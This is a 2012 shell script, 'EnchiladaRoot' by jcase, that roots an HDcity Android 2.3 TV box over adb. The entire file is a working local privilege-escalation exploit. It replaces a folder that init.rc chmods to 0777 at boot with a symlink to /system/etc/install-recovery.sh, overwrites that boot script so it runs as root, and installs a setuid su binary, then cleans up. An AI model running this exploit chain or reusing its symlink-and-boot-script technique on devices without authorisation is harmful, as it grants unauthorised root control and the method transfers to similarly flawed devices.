#!/bin/sh
echo "EnchiladaRoot 1.0 by jcase / TeamAndIRC"
echo "for the HDcity Android 2.3 TV box"
echo "March 21st 2012"
echo "Follow me! http://www.twitter.com/TeamAndIRC"
echo "-"
echo "Special thanks to Ralph from Austrailia, who gave me ssh access to his TV box"
echo "-"

echo "First lets push su and pwn.sh to /data/local"

adb push su /data/local/su
adb push pwn.sh /data/local/pwn.sh

echo "We are going to use install-recovery.sh to run our commands, so lets back it up before we overwrite it"

adb shell "busybox cp /system/etc/install-recovery.sh /data/local/install-recovery.sh.backup"

echo "init.rc sets chmod 0777 /data/internal-device/DCIM on boot, and leaves system r/w, so lets chmod install-recovery.sh and reboot"

adb shell "busybox mv /data/internal-device/DCIM /data/internal-device/DCIM2"
adb shell "ln -s /system/etc/install-recovery.sh /data/internal-device/DCIM"
adb reboot
adb wait-for-device
sleep 10

echo "Now we can write to install-recovery.sh so lets replace it with out own script, and it will be ran as root on boot"

#  contents of pwn.sh (dont run these commands, just listing contents here)
# /system/xbin/busybox cp /data/local/su /system/xbin/su
# chmod 0.0 /system/xbin/su
# chmod 06755 /system/xbin/su

adb shell "cat /data/local/pwn.sh > /system/etc/install-recovery.sh"
adb reboot
adb wait-for-device
sleep 10

echo "now we have su installed, lets clean up our mess and set everything else back to normal"
adb shell "cat /data/local/install-recovery.sh.backup > /system/etc/install-recovery.sh"
adb shell "rm /data/internal-device/DCIM"
adb shell "mv /data/internal-device/DCIM2 /data/internal-device/DCIM"
adb shell su -c "chmod 544 /system/etc/install-recovery.sh"

echo "You can install superuser app from the market or elsewhere, or just use su as is in adb"
